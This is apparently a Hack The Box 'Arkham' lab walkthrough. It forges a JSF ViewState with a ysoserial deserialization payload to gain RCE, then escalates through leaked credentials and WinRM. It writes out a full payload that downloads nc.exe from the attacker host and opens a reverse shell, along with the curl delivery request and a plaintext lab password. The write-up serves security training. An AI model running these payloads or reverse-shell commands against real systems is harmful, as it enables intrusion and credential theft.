## Enumeration
I use masscan and nmap for a quick scan, here i use a script which create a keepnote page report from the scan, found it here [script](https://github.com/roughiz/EnumNeTKeepNoteReportCreator/blob/master/keepNoteScanNetReportCreator.sh).
 
In my first enumeration we can see, ftp and smb share, also http  (80,8080) ports :
```
$ create_SemiNoteFromIpWithMasscan.sh 10.10.10.130  /path/keepnote/Lab/htb Arkham  tun0
80/tcp open http Microsoft IIS httpd 10.0
135/tcp open msrpc Microsoft Windows RPC
139/tcp open netbios-ssn Microsoft Windows netbios-ssn
445/tcp open microsoft-ds?
8080/tcp open http-proxy
```

We have nothing with 80 port, and in 8080 port we can see a web application deployed with Tomcat and used ".faces" which is an exension of JSF (Java Server Faces). We have nothing intersting in the this application, so let's move to samba share.

Here trying to find any anonymous authentication to samba shares:
``` 
$ smbmap -u anonymous  -d htb.local -H 10.10.10.130
	----                                               -----------
	ADMIN$                                             NO ACCESS
        BatShare                                           READ ONLY
	C$                                                 NO ACCESS
	IPC$                                               READ ONLY
	Users                                              READ ONLY
``` 

As we can see we have anonymous "Read Only" access to BatShare and Users shares. and in the "BatShare" i found a zip file appserver.zip, in this archive i have a "LUKS encrypted file" (backup.img)
this file appears to be encrypted, so at the first i used binwalk to extract any useful data without decrypt it.
```
$ binwalk -e backup.img
```
Biwalk extract some useful files, here i have a folder "MASK", with same tomcat configuration files, and in intersting web.xml.bak file.

We can also crack it with hashcat and create a partition with cryptsetup and mount it like: 
```
$ hashcat --force -a 0 -w 3  -m 14600   backup.img  wordlist
Session..........: hashcat                       
Status...........: Bypass
Hash.Type........: LUKS
Hash.Target......: luks-header
Time.Started.....: Mon Apr  1 14:06:50 2019 (7 secs)
Time.Estimated...: Mon Apr  1 14:08:57 2019 (2 mins, 0 secs)
Guess.Base.......: File (wordlist)
Guess.Queue......: 1/1 (100.00%)
Speed.Dev.#1.....:        9 H/s (10.77ms) @ Accel:2 Loops:256 Thr:256 Vec:1
Recovered........: 0/1 (0.00%) Digests, 0/1 (0.00%) Salts
Progress.........: 0/1111 (0.00%)
Rejected.........: 0/0 (0.00%)
Restore.Point....: 0/1111 (0.00%)
Candidates.#1....: batman -> batmanforever
HWMon.Dev.#1.....: N/A

Started: Mon Apr  1 14:06:50 2019
Stopped: Mon Apr  1 14:06:57 2019
```
hashcat can be very very slow so i tried to make a small wordlist from rockyou, thanks to my first enumeration:
```
$ cat rockyou.txt| grep -i "batman" >  wordlist
```
Here i create a luks partition
```
$ cryptsetup -v luksOpen  backup.img Decrypted_partition
Enter passphrase for backup.img:
```
And finally mount the partition :

```
$ sudo mount /dev/mapper/Decrypted_partition /media/backup
```

The mounted backup has almost the same files, but nothing more intersting.
So let's back to  the "web.xml.bak"

```
<param-name>org.apache.myfaces.SECRET</param-name>
<param-value>SnNGOTg3Ni0=</param-value>
</context-param>
    <context-param>
        <param-name>org.apache.

myfaces.MAC_ALGORITHM</param-name>
        <param-value>HmacSHA1</param-value>
     </context-param>
<context-param>
<param-name>org.apache.myfaces.MAC_SECRET</param-name>
<param-value>SnNGOTg3Ni0=</param-value>
................
```
In this backup web.xml file used for tomcat deployement configuration, we can see that the machine use "Apache MyFaces Software", anh here we have some configuration informatoion for JSF. secret algo for encryption and mac hash. also we can see that we have JSF  ViewState.
For more informations about JSF ViewState :

https://www.synacktiv.com/ressources/MISC69_pentest_JSF.pdf
https://www.synacktiv.com/ressources/JSF_ViewState_InYourFace.pdf

The first step here is to find where application used a viewstate object, and it was very fast to find :

##### http://10.10.10.130:8080/userSubscribe.faces

In the page we can see 
```
<input type="hidden" name="javax.faces.ViewState" id="javax.faces.ViewState" value="wHo0wmLu5ceItIi+I7XkEi1GAb4h12WZ894pA+Z4OH7bco2jXEy1RQxTqLYuokmO70KtDtngjDm0mNzA9qHjYerxo0jW7zu1mdKBXtxnT1RmnWUWTJyCuNcJuxE=">
```

Here i have the viewstate object serialized, which it's simply a java object converted to a binary format. that let any other java application to convert it to a java object later. This operation called "deserialization", and can let a hacker to change this flow and perfom an RCE attack.
In the value variable, a serializable object is encrypted, the idea here is to understand how the app encrypt and decrypt. And create a python tool to make the two functions, replace this value with our payload after encryption.

After reading many JSF configurations of viewsate, refering to documentations below :

https://myfaces.apache.org/core20/myfaces-impl/webconfig.html#org_apache_myfaces_MAC_SECRET
https://myfaces.apache.org/core20/myfaces-impl-shared/xref/org/apache/myfaces/shared/util/StateUtils.html

DES is the default encryption algo, with ECB mode and PAD_PKCS5 as padding.
Mac algo is HMAC SHA1( 20 bytes length).

![doc](https://github.com/roughiz/Arkham-walktrough/blob/master/jsfdoc.png)

With all theses informations i write a  python viestate algo of encryption and decryption.

SHA1 HMAC hash is always 160 bits (e.g. 20 bytes)
#### Encrypt 

output = DES(Encrypt,object) 
output+=  MACSHA1(output)
final = base64encode(output)

#### Decrypt

mac_length  = 20
output = base64decode(object)
data =output[:len(output)-mac_length]
mac = output[len(output)-mac_length:]
decrypted_data = DES(Decrypt,data)
verified_mac= MACSHA1(data) == mac
 


##### Secret key definition in documentation :
#### Description: 
Defines the secret (Base64 encoded) used to initialize the secret key for encryption algorithm. See MyFaces wiki/web site documentation for instructions on how to configure an application for different encryption strengths.

So the secret key in web.xml is base64 encoded :
```
$  key=$(echo "SnNGOTg3Ni0=" | base64 -d)
key="JsF9876-"
```
#####  Nota :

Serialized object has the followig patterns :
##### "'\xac\xed\x00\x05" in Hexa 
or 
##### "r00" in Base64

And with our viewstate python decrypt function we have the good head pattern :
```
$ python viewstate.py -a decrypt 
data decrypted: '\xac\xed\x00\x05ur\x00\x13[Ljava.lang.Object;\x90\xceX\x9f\x10s)l\x02\x00\x00xp\x00\x00\x00\x03t\x00\x011pt\x00\x12/userSubscribe.jsp'
```

It works great, so let's create a payload now.
For that i use a famous tool, which generate payloads for Java object deserialization, [ysoserial](https://github.com/frohoff/ysoserial)

I found a fork from this tool, more simple to add commands for (bash, cmd , powershell) [modified ysoserial](https://github.com/pimps/ysoserial-modified)

We can use many payloads types, and at the first i used Myfaces1 and Myfaces2 but they dosen't work, i had this error: 

##### javax.faces.application.ViewExpiredException: viewId:/userSubscribe.faces - No saved view state could be found for the view identifier: /userSubscribe.faces
And i spent many many times but dosen't work, until i tried other payload and finally "CommonsCollections5" works great and i could ping my self.

First listen for icmp :
```
$ sudo tcpdump -v -nni tun0 icmp

$ java -jar ysoserial-modified.jar CommonsCollections5 cmd  'ping 10.10.14.7'  > payload
```

To encode special caracters to url format :
```
$  echo $(python viewstate.py -a encrypt )  | sed -f /usr/lib/ddns/url_escape.sed
```
![ping](https://github.com/roughiz/Arkham-walktrough/blob/master/ping.png)

I used curl to post the viewstate payload manually.
The idea here is to find the way to uplaod nc.exe and execute it. we have to know if the box has powershell or python etc ..
When i tried many things i noticed that when the command is executed we have a 500 error with :
##### "cannot be cast to class [Ljava.lang.Object; (javax.management.BadAttributeValueExpException".

If command dosen't work or payload dosent work we have an 500 error : 
##### "javax.faces.application.ViewExpiredException: viewId:&#47;userSubscribe.faces - No saved view state could be found for the view identifier: &#47;userSubscribe.faces"

That was very important so i could guess if the contains per example (python, powershell ...) 

### Note : we can also add && ping to our command to be sur it was well executed

## Final exploit for user shell :

```
$ java -jar ysoserial-modified.jar CommonsCollections5 cmd "powershell -ExecutionPolicy Bypass -Command \"& Invoke-WebRequest 'http://10.10.14.7/nc.exe' -OutFile 'C:\Users\Public\nc.exe'  \" && C:\Users\Public\nc.exe 10.10.14.7 443 -e powershell" > payload

$ data=$(python viewstate.py -a encrypt    | sed -f /usr/lib/ddns/url_escape.sed )

$ curl -i -s -k  -X $'POST' -H $'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0' -H $'Referer: http://10.10.10.130:8080/userSubscribe.faces' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Upgrade-Insecure-Requests: 1' -b $'JSESSIONID=JSESSIONID='  --data-binary $'j_id_jsp_1623871077_1%3Aemail=balol%40gmail.com&j_id_jsp_1623871077_1%3Asubmit=SIGN+UP&j_id_jsp_1623871077_1_SUBMIT=1&javax.faces.ViewState='$data $'http://10.10.10.130:8080/userSubscribe.faces'
```
![user shell](https://github.com/roughiz/Arkham-walktrough/blob/master/usershell.png)
## Privilege Escalation

After digging in the machine, i found a zip file with an ".ost" file which is an outlook email folder, first we have to convert it to pst :
```
$ java -jar ost2pst.jar alfred@arkham.local.ost mail.pst
```
And convert the ".pst" to ".mbox" readable by linux
```
$ readpst -o . -k mail.pst
```

And we can read the .mbox file. it contains a msg for Batman, in the mail we have an attached image file encoded in base64, so i create an image like :
```
$ cat img | sed 's/ //g' | base64 -d > img.png
```

The image contains a shell screen of how alfred mount G: drive with credentilas of batman, so lets use this password to run a command as Batman.
The password for batan is "Zx^#QZX+T!123"
![image](https://github.com/roughiz/Arkham-walktrough/blob/master/imagefromemail.png)

With some enumerations, batman is a member of "remote manager" and "administrators" group.

```
Local Group Memberships      *Administrators       *Remote Management Use
```
![groups member](https://github.com/roughiz/Arkham-walktrough/blob/master/batmangroup.png)
And this group members can access WMI, like you can see below:
```
net localgroup "Remote Management Users"
net localgroup "Remote Management Users"
Alias name     Remote Management Users
Comment        Members of this group can access WMI resources over management protocols (such as WS-Management via the Windows Remote Management service). This applies only to WMI namespaces that grant access to the user.

Members

-------------------------------------------------------------------------------
Batman
```

With ps in powershell we can see : 

####### MsMpEng  : windows defender agent
And also :
```
$ whoami /priv
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State   
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

I noticed that UAC is enable, so when i tried any runas powershell script it dosen't works.
```
PS> $username = 'batman';$password = 'Zx^#QZX+T!123';$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;$credential = New-Object System.Management.Automation.PSCredential $username,$securePassword;Invoke-Command -Credential $credential -ComputerName ARKHAM -Command { cmd /k C:\tomcat\apache-tomcat-8.5.37\bin\bc.exe 10.10.14.7 80 -e cmd}
```

```
$ netstat -ano
0.0.0.0:5985           ARKHAM:0               LISTENING  ( WINDOWS REMOTE MANAGEMENT or Winrm)
..........
```

####### 5958 port is listening and also with information founded before, i understand that batman use WinRm, and with some research i figured out how to use it to have a session as batman.

PowerShell Remoting is essentially a native Windows remote command execution feature that’s build on top of the Windows Remote Management (WinRM) protocol.  Based on my super Google results, WinRM is supported by Windows Vista with Service Pack 1 or later, Windows 7, Windows Server 2008, and Windows Server 2012.

An interactive PowerShell console can be obtained on a remote system using the “Enter-PsSession” command.  It feels a little like SSH.  Similar to “Invoke-Command”, “Enter-PsSession” can be run as the current user or using alternative credentials from a non domain system.  Examples below.
#######  Examples of having session with powershell
```
Enter-PsSession –ComputerName '10.10.10.130' 
Enter-PsSession –ComputerName servername –Credentials domain\serveradmin
Enter-PsSession –ComputerName servername –Credentials $credentilas
```

In my case i did :
```
$username = 'batman';$password = 'Zx^#QZX+T!123';$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;$credential = New-Object System.Management.Automation.PSCredential $username,$securePassword;Enter-PSSession -ComputerName arkham -Credential $credential;
```
![first_session](https://github.com/roughiz/Arkham-walktrough/blob/master/batmansession.png)

Now i have a session shell but it's a very limited session due to  UAC, the idea is to obtain an other shell with nc.exe. So lets found a folder which Batman have access. i used  icacls (dir and cd  dosen't work with uac rules).
Batman have access to 'C:\tomcat\apache-tomcat-8.5.37\bin\'   so i use nc.exe from it like :
```
> C:\tomcat\apache-tomcat-8.5.37\bin\nc.exe 10.10.14.7 80 -e cmd
```
![second_session](https://github.com/roughiz/Arkham-walktrough/blob/master/batmannewsession.png)
Now we have an other shell, but i can't read the flag in administrator directory, due to UAC restriction, so here we have two solutions:

####### 1) Bypass UAC with a script ... but this version of windows is new and all uac bypass scripts founded dosen't work.
####### 2) use samba share to have all access  to C: like :

```
$ pushd \\arkham\C$

We can also type the share like:
$ type \\arkham\C$\Users\Administrator\Desktop\root.txt

Or mount a drive like :
$ net use r: \\arkham\c$ 
$ r:
```
![root_dance](https://github.com/roughiz/Arkham-walktrough/blob/master/pushed.png)
